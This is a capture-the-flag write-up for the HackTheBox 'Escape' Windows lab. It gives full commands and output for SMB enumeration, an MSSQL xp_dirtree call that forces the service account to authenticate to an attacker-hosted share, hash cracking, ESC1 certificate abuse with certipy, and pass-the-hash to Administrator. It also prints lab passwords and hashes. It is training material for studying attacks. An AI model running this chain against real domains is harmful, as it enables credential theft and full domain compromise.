---
title: "HackTheBox - Escape"
published: true
---

| Field            | Details                                                                                                                                                                   |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                                                                                                   |
| **Difficulty**   | Medium                                                                                                                                                                    |
| **Release Date** | 2023-02-25                                                                                                                                                                |
| **Pwned Date**   | 2026-07-20                                                                                                                                                                |
| **Tags**         | `smb` `microsoft sql server` `impacket-mssqlclient` `responder` `hash capture` `hashcat` `evil-winrm` `adcs` `certipy-ad` `esc1` `clock skew` `date sync` `pass-the-hash` |

## Summary

Escape is a Medium difficulty Windows Active Directory machine with an SMB share. With anonymous access is possible to download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user ryan.cooper. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are allowed to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.

## Reconnaissance

### Port scan

Start with port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49666,49689,49690,49708,49719 -oN service_scan.txt <TARGET_IP>
```

In any case the output should look like this

```
--- Detected ports ---
port: 53; protocol: tcp; state: open
port: 88; protocol: tcp; state: open
port: 135; protocol: tcp; state: open
port: 139; protocol: tcp; state: open
port: 389; protocol: tcp; state: open
port: 445; protocol: tcp; state: open
port: 464; protocol: tcp; state: open
port: 593; protocol: tcp; state: open
port: 636; protocol: tcp; state: open
port: 1433; protocol: tcp; state: open
port: 3268; protocol: tcp; state: open
port: 3269; protocol: tcp; state: open
port: 5985; protocol: tcp; state: open
port: 9389; protocol: tcp; state: open
port: 49666; protocol: tcp; state: open
port: 49689; protocol: tcp; state: open
port: 49690; protocol: tcp; state: open
port: 49708; protocol: tcp; state: open
port: 49719; protocol: tcp; state: open

--- Detected services ---
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 08:53 -0400
Nmap scan report for 10.129.30.17
Host is up (0.028s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-13 20:53:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-13T20:55:19+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-13T20:55:19+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.30.17:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.129.30.17:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-13T20:51:21
|_Not valid after:  2056-07-13T20:51:21
|_ssl-date: 2026-07-13T20:55:19+00:00; +8h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-13T20:55:19+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-13T20:55:19+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-13T20:54:39
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.87 seconds
```

### SMB enumeration

List available shares

```bash
smbclient -L //<TARGET_IP> -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Public          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.30.17 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Notice the non-default 'Public' share and try to list its contents

```bash
smbclient //<TARGET_IP>/Public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1467960 blocks available
```

Retrieve the file, it contains credentials for guest access on the Microsoft SQL server discovered earlier by the port scan

```
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1
```

Connect to sql server

```bash
impacket-mssqlclient sequel/PublicUser:GuestUserCantWrite1@<TARGET_IP> -p 1433
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

## Initial access

### Hash capture

Once gained access to the sql server it's possible to trigger an authentication attempt by the service user running the server process to a malicious smb share hosted by you, allowing you to capture the service user's hash.

Start up a smb share on your machine and listen

```bash
sudo responder -I tun0 -v
```

Trigger the authentication attempt on the target from the sql shell

```bash
SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\<ATTACKER_IP>\share'
subdirectory   depth
------------   -----
```

You should receive the following on the listener

```
[SMB] NTLMv2-SSP Client   : 10.129.30.17
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:718b5b38172ba041:558535BD79596B2EA1F1790DAEF5900A:0101000000000000801020C7B912DD01F1D430612AE06D030000000002000800540033003100550001001E00570049004E002D0041003500460058003500540032003200540051004B0004003400570049004E002D0041003500460058003500540032003200540051004B002E0054003300310055002E004C004F00430041004C000300140054003300310055002E004C004F00430041004C000500140054003300310055002E004C004F00430041004C0007000800801020C7B912DD01060004000200000008003000300000000000000000000000003000003CBCC02A546F9CAC30FB0ECBC12DB631925CE4A1607E1E826E3DD8CF5343DA220A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330031000000000000000000
```

The 'sql_svc' user tried to authenticate to your smb share and sent its hash.

### Hash cracking

Now that you have the hash you can try to crack it

Save the hash to a file

```bash
cat hash.txt
sql_svc::sequel:718b5b38172ba041:558535BD79596B2EA1F1790DAEF5900A:0101000000000000801020C7B912DD01F1D430612AE06D030000000002000800540033003100550001001E00570049004E002D0041003500460058003500540032003200540051004B0004003400570049004E002D0041003500460058003500540032003200540051004B002E0054003300310055002E004C004F00430041004C000300140054003300310055002E004C004F00430041004C000500140054003300310055002E004C004F00430041004C0007000800801020C7B912DD01060004000200000008003000300000000000000000000000003000003CBCC02A546F9CAC30FB0ECBC12DB631925CE4A1607E1E826E3DD8CF5343DA220A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330031000000000000000000
```

Run hashcat to attempt cracking

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 2948/5896 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (6033 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

SQL_SVC::sequel:718b5b38172ba041:558535bd79596b2ea1f1790daef5900a:0101000000000000801020c7b912dd01f1d430612ae06d030000000002000800540033003100550001001e00570049004e002d0041003500460058003500540032003200540051004b0004003400570049004e002d0041003500460058003500540032003200540051004b002e0054003300310055002e004c004f00430041004c000300140054003300310055002e004c004f00430041004c000500140054003300310055002e004c004f00430041004c0007000800801020c7b912dd01060004000200000008003000300000000000000000000000003000003cbcc02a546f9cac30fb0ecbc12db631925ce4a1607e1e826e3dd8cf5343da220a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100330031000000000000000000:REGGIE1234ronnie

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:718b5b38172ba041:558535bd79596b2ea1...000000
Time.Started.....: Mon Jul 13 11:52:53 2026 (6 secs)
Time.Estimated...: Mon Jul 13 11:52:59 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1722.4 kH/s (3.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10706944/14344385 (74.64%)
Rejected.........: 0/10706944 (0.00%)
Restore.Point....: 10698752/14344385 (74.58%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: REPIN210 -> RAHRYA

Started: Mon Jul 13 11:52:52 2026
Stopped: Mon Jul 13 11:53:01 2026
```

hashcat managed to crack the hash and the sql_svc user password is **REGGIE1234ronnie**.

### Access

Use the discovered credentials to establish a foothold

```bash
evil-winrm -i <TARGET_IP> -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> dir
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

## Lateral movement

The C:\ folder contains a non-default 'SQLServer' folder

```powershell
    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
```

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

Focus on the 'ERRORLOG.BAK' file

The file contains several lines starting with 'Logon', these are probably authentication attempts

Let's look at them

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK | findstr "Logon"
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

One of the logon failures shows 'NuclearMosquito3' as the username. This is unlikely to be a username, most likely a password that was typed by mistake in the username field. This is probably the password of the Ryan.Cooper user since the only other logon failed line belongs to him

### Access

Try to access the target via winRM with the Ryan.Cooper account and the discovered password

```bash
evil-winrm -i <TARGET_IP> -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

The credentials worked.

## Privilege escalation

### AD CS enumeration

With the Ryan.Cooper credentials run a AD CS (Active Directory Certificate Services) check

```bash
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip <TARGET_IP> -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260714115228_Certipy.txt'
[*] Wrote text output to '20260714115228_Certipy.txt'
[*] Saving JSON output to '20260714115228_Certipy.json'
[*] Wrote JSON output to '20260714115228_Certipy.json'
```

Look at the output file generated by the command

```bash
cat 20260714115228_Certipy.txt
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

AD CS has a vulnerable certificate template named 'UserAuthentication'.

A certificate template defines:

- What the certificate can be used for
- Who can request it
- How long is valid
- What info goes into it

The 'UserAuthentication' template has a ESC1 vulnerability. The following properties make it vulnerable:

- **enrollee supplies subject** -> the user can specify any identity, so it can request a certificate for any account
- **Client Authentication: True** → the certificate can be used for authentication
- **Enrollment Rights: SEQUEL.HTB\Domain Users** → all domain users can ask for a certificate

### Certificate request

Add the following line to the /etc/hosts file on your machine

```
<TARGET_IP> dc.sequel.htb sequel.htb
```

Request a certificate for the Administrator account

```bash
certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn Administrator@sequel.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Got the certificate in the 'administrator.pfx' file

### Date/time sync

The next step would be to try to authenticate with the certificate.

This step may fail depending on the time set on your machine: if the date/time of your machine are different from the date/time of the target you will get an error like

```
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This happens because Kerberos does not provide the TGT if the clock skew is too great.

If this happens to you in the next step, come back here and run

```bash
sudo systemctl stop systemd-timesyncd
sudo timedatectl set-ntp false
sudo date --set="$(net time -S <TARGET_IP>)"
Wed Jul 15 11:04:05 PM CEST 2026
```

These commands sync the date/time on your machine with the one on the target

### Certificate authentication

Attempt to authenticate with the certificate

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <TARGET_IP>
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Got the hash of the Administrator user: **aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee**

### Pass-the-hash

The discovered hash is in the form <LM_HASH>:<NT_HASH>

You can use the NT hash to access the Administrator account via winRM

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

Got admin access.

## Lessons learned

A key insight from this box was understanding that database access can allow much more than traditional data exfiltration.

I spent a lot of time enumerating the databases to find useful information such as credentials while the true vector was in leveraging the database context itself to influence system behavior.

Forcing the service account to authenticate to an attacker-controlled SMB share transformed a limited read-only database session into a credential harvesting opportunity, capturing the NetNTLM hash of the SQL Server service account.

This highlights the importance of viewing database access not merely as a data repository to be queried, but as an execution context capable of triggering network interactions, file system operations and authentication events that can pivot the attack in unexpected directions.
